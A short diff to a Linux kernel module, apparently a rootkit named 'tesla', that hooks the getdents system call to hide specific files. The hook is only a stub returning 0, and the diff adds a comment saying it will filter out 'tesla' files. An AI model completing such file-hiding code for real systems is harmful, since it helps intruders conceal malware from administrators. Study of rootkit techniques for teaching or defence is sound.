@@ -19,6 +19,7 @@ MODULE_LICENSE("GPL v2");
 /* we intercept getdents so as to hide specific files. */
 asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
 {
+	//call getdents and use the information to filter out tesla files
     return 0;
 }
 
